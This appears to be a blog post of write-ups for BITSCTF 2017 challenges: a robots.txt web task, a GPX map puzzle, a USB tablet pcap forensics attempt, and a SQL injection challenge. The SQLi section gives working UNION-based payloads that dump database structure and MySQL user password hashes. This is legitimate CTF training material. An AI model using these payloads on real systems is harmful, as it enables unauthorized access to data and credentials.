@@ -1,0 +1,245 @@
+---
+layout: post
+title: "BITSCTF 2017 - Write-ups"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+  - misc
+date: 2017/02/05
+thumbnail: /images/ctf.png
+---
+
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : BITSCTF 2017
+- **Website** : [bitsctf.bits-quark.org](https://bitsctf.bits-quark.org/)
+- **Type** : Online
+- **Format** : Jeopardy
+- **CTF Time** : [link](https://ctftime.org/event/417)
+
+## 10 - BotBot - web
+
+> Should not ask for the description of a 5 marker.
+>
+> botbot.bitsctf.bits-quark.org
+
+Let's look at the source code:
+
+```html
+<!DOCTYPE HTML>
+<!--
+	Nothing to see here. Maybe try looking up seo .txt
+-->
+<html>
+
+[...]
+```
+
+Now go to `http://botbot.bitsctf.bits-quark.org/robots.txt`:
+
+```
+Useragent *
+Disallow: /fl4g
+```
+
+http://botbot.bitsctf.bits-quark.org/fl4g/ :
+
+```
+BITCTF{take_a_look_at_googles_robots_txt}
+```
+
+## 20 - Labour - Misc
+
+> Follow your heart, for it leads you straight to the answer.
+
+It's a gpx file:
+
+```
+<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
+<gpx version="1.1" creator="BITSCTF" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.topografix.com/GPX/1/1" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd">
+
+<!--Use appropriate brackets and underscores to separate words if you succeed-->
+<wpt lat="23.71697" lon="89.45508">
+<ele>12.1</ele>
+<name>WP01-A</name>
+</wpt>
+<wpt lat="22.82885" lon="80.79786">
+<name>WP02-B</name>
+</wpt>
+<wpt lat="39.88276" lon="58.81642">
+<name>WP03-C</name>
+</wpt>
+<wpt lat="15.43674" lon="27.65039">
+<name>WP04-D</name>
+</wpt>
+<wpt lat="12.69179" lon="17.50781">
+<ele>288.7</ele>
+<name>WP05-E</name>
+</wpt>
+<wpt lat="14.91081" lon="100.47656">
+<ele>13.1</ele>
+<name>WP06-F</name>
+</wpt>
+<wpt lat="45.9267" lon="2.21484">
+<ele>557.9</ele>
+<name>WP07-G</name>
+</wpt>
+<wpt lat="4.11852" lon="102.19922">
+<ele>67.2</ele>
+<name>WP08-H</name>
+</wpt>
+<wpt lat="34.85709" lon="65.84765">
+<ele>3209.7</ele>
+<name>WP09-I</name>
+</wpt>
+<wpt lat="28.89086" lon="68.30859">
+<ele>116.9</ele>
+<name>WP10-J</name>
+</wpt>
+<wpt lat="39.20502" lon="31.92187">
+<ele>797.8</ele>
+<name>WP11-K</name>
+</wpt>
+<wpt lat="47.24344" lon="19.8457">
+<ele>93.5</ele>
+<name>WP12-L</name>
+</wpt>
+<wpt lat="25.30828" lon="29.84765">
+<ele>267</ele>
+<name>WP13-M</name>
+</wpt>
+<wpt lat="18.97119" lon="-72.28521">
+<ele>375</ele>
+<name>WP14-N</name>
+</wpt>
+<wpt lat="-13.61609" lon="17.68359">
+<ele>1510.9</ele>
+<name>WP15-O</name>
+</wpt>
+<wpt lat="33.84122" lon="102.23438">
+<ele>3426.2</ele>
+<name>WP16-P</name>
+</wpt>
+<wpt lat="46.89624" lon="69.53907">
+<ele>364.4</ele>
+<name>WP17-Q</name>
+</wpt>
+</gpx>
+```
+We can open it online with:
+- http://www.visugpx.com/index.php
+- http://www.gpsvisualizer.com/map?output_home
+
+Take the waypoint in order and write the name of the country:
+1. WP01-A - Bangladesh
+2. WP02-B - India
+3. WP03-C - Turkmenistan
+4. WP04-D - Sudan
+5. WP05-E - Chad
+6. WP06-F - Thailand
+7. WP07-G - France
+8. WP08-H - Malesia
+9. WP09-I - Afganistan
+10. WP10-J - Pakistan
+11. WP11-K - Turkey
+12. WP12-L - Hungary
+13. WP13-M - Egypt
+14. WP14-N - Haiti
+15. WP15-O - Angola
+16. WP16-P - China
+17. WP17-Q - Kazaksztan
+
+Taking the first letter of each country in order give me **BITSCTFMAPTHEHACK** and the comment said:
+
+> Use appropriate brackets and underscores to separate words if you succeed
+
+So I get **BITSCTF{MAP_THE_HACK}**
+
+# 30 - Batman vs Joker - Web
+
+> Joker has left a message for you. Your job is to get to the message asap.
+>
+> joking.bitsctf.bits-quark.org
+
+Try a quick `' or 1=1 #'`: this is working so we have a vulnerable MySQL database.
+
+Let's enjoy SQLi.
+
+Just curious to know the DB version: `' or 1=1 UNION SELECT @@version,1 #`: **5.5.54-0+deb8u1**
+
+Current databse name: `' or 1=1 UNION SELECT database(),1 #`: **hack**
+
+Just curious to list the databse users: `' or 1=1 UNION SELECT host, user FROM mysql.user #` and `' or 1=1 UNION SELECT user, password FROM mysql.user #`:
+
+host | user | password
+--- | --- | ---
+% | tester | \*975B2CD4FF9AE554FE8AD33168FBFC326D2021DD
+127.0.0.1, 33842653d6db, ::1, localhost | root | \*A2AE2E3109CE064A1AED30C0E71E021540F30700
+localhost | debian-sys-maint | \*A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F
+
+I want to know the name of tables in the hack databse: `' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = 'hack' #`:
+
+table_schema | table_name
+--- | ---
+hack | CIA_Official_Records
+hack | joker
+
+And finally I want to know the name of columns in the both previous tables: `' or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'CIA_Official_Records' or table_name = 'joker' #`:
+
+table_name | column_name
+--- | ---
+CIA_Official_Records | id
+CIA_Official_Records | username
+CIA_Official_Records | first_name
+CIA_Official_Records | last_name
+Joker | Flag
+Joker | HaHaHa
+
+Pretty easy to know where to find teh flag now: `' or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #`:
+
+Flag | HaHaHa
+--- | ---
+BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!} | Enjoying the game Batman!!!
+
+## 50 - Tom and Jerry - Forensics
+
+**WARNING**: we didn't solve this challenge, so write-up is incomplete.
+
+Open the pcapng with Wireshark.
+
+Device Descriptor tell us:
+
+```
+idVendor: Wacom Co., Ltd (0x056a)
+idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4)
+```
+
+So this is a Pen Tablet.
+
+We can use a filter `usb.transfer_type == 0x01` to oly see frame where there is data.
+
+We can complete the filter with `(frame.len == 73)` to see only one side of the exchange and `!(usb.capdata == 00:00:00:00:00:00:00:00)` to hide null data. Finally that give us this filter: `((usb.transfer_type == 0x01) && (frame.len == 73)) && !(usb.capdata == 00:00:00:00:00:00:00:00)`.
+
+USB transfert type is *USB INTERRUPT*: http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt
+
+To extract the data only from the pcapng I used tshark:
+
+```
+tshark -r Cat.pcapng -T fields -e usb.capdata > capdata.txt
+```
+
+I didn't have time to search how to interpret the raw data into coordinates.
